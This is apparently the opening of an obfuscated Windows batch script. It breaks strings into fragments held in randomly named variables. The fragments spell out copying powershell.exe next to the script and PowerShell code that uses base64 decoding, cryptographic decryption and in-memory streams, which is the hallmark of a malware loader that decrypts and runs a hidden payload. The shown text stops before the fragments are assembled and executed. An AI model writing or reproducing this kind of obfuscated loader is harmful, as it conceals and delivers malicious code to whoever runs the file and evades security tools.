@echo off
set "LZwzcEKKdE=we"
set "EOtNcVMGor=0\"
set "QiPeIXJqqZ=Sy"
set "msdBkkvVOM=\v"
set "lbDKnsuSzY=.e"
set "rtzkWPHFmA=em"
set "QwGDMgoseM=co"
set "WRMnUxIEhS=in"
set "PunSVFsUKy=ll"
set "sMRtZPecld=32"
set "jfChaNlbEG=ll"
set "sZCSYVitmk= C"
set "nfurfmYYOm=ws"
set "PPofOIYjcw= /"
set "gAUtNzaFUm=we"
set "LHnUQQnazT=:\"
set "BOXXEQTNEQ=nd"
set "DfvBwKqyvs=\W"
set "yKQVtgUlmg=he"
set "XUgUanwLBt=ow"
set "peePHkJbJh=do"
set "dmbXbxZqyp=rs"
set "gqQvJXsZru=xe"
set "zjjTDAaDzC=Po"
set "ffFadxlWjO=y "
set "yOGxhIOUvY=he"
set "dFvRdwJYaG=1."
set "moBvWNfaEh=Wi"
set "lLhsKeyhWl=s\"
set "FvQBvfGoKi=po"
set "boOoeQwuhH=rS"
set "UJFsjyMHlX=py"
set "WAvJWshGuI=st"
set "kLTgxvxJCX= %~dp0"
set "DZkPaVjHAn=cd"
set "oaZvAdBSyv=y, 0"
set "TuxyutrRto=le  "
set "HoklGNUgsy===')"
set "TCGLKHzPVN=em.I"
set "pZiDguExxU=n ''"
set "EGaHmsAiLb=New-"
set "edYlLQWnVF=m.Re"
set "nVLdpUupzg=Zt ="
set "ezFJCYifYn=-Obj"
set "tnhuAVuBna= = N"
set "NmmNiRtVbY=H = "
set "aAZxAMiRQj=Secu"
set "WfEWtDlzYI=pStr"
set "cTGwRbQGaB=stem"
set "gpOBislEQH=);$A"
set "EQCwKQuFaO=d;$Z"
set "XdHbSFGWDd=;$GB"
set "awjmcCkXYp=ach "
set "kogGkPCTSu=stem"
set "kbUXXSFnzU= if "
set "xuismDDpcV=daeR"
set "LBpoNsMGhi=rans"
set "rmrHrzuSbT=G.En"
set "OUPALNgDMg=brea"
set "XjLjbjTiLZ=xKsN"
set "BShNIdGHQk='[-1"
set "jveRyNqkOW=);$Z"
set "agJOfVPlOz=Secu"
set "ZFcUqWHLAB= '')"
set "hrdEdtRYhk=pTly"
set "AJxfxjvybl=y]::"
set "HrPhFFcTUG=)($H"
set "tDmxoKhtEp=em.C"
set "TjefaCaeYa=.Dis"
set "dxPMuPWubu=k; }"
set "DoVYkhIVMn=CFxo"
set "eUruCMltqQ=urit"
set "jPGZMEQwDG=$mTD"
set "VVGQBFyAOV=iRH."
set "oDlKHttMkt=ly ="
set "ALrMTDXEIt=::De"
set "XyQOoEFAhz=comp"
set "zLKTaFnSfw=TllA"
set "sQVxnTBKNM=vlDU"
set "XRwDHAxVVs= [Sy"
set "KOVjJkAnYX=yste"
set "fiwNevMDlg=S46e"
set "hjznIoVKKG=ecry"
set "nSxmJYrpNw=esaB"
set "xRCwtvxzHG=t Sy"
set "IFdIacadoT=hSy "
set "DsDexxIXnk=FKJv"
set "PPYRfkdMnm=.Con"
set "iYQIlhqojp=rt]:"
set "jEeCIODseh=rofi"
set "QUdbRsCpCG=tem."
set "xZrFQDIlaP=]::("
set "ScXXkuunsz=gth)"
set "TbBgaGAmqv=iron"
set "qTeDKpLYpX=mory"
set "qNnAUpQdfy=null"
set "TvwvLSWeXL=;$iQ"
